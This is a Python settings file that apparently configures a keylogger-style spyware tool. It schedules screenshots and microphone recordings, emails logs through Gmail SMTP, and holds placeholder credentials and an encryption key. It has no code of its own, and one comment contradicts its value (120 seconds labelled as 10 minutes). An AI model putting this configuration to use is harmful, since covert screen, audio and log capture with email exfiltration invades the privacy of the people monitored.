# === Time settings (in seconds) ===
EMAIL_INTERVAL = 120             # Send logs every 10 minutes
SCREENSHOT_INTERVAL = 300        # Take a screenshot every 5 minutes
MIC_INTERVAL = 900               # Records microphone every 15 munutes
MIC_DURATION = 10                # Dureation of audio recording 


ENABLE_PERIODIC_TASK = True      # Toggle periodic task on/off    

# === EMAIL CONFIGURATION ===
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_app_password"
EMAIL_RECEIVER = "receiver@example.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# === Encryption key (use Fernet.generate_key() to generate once and copy it here)
ERNET_KEY = b'your_generated_key_here'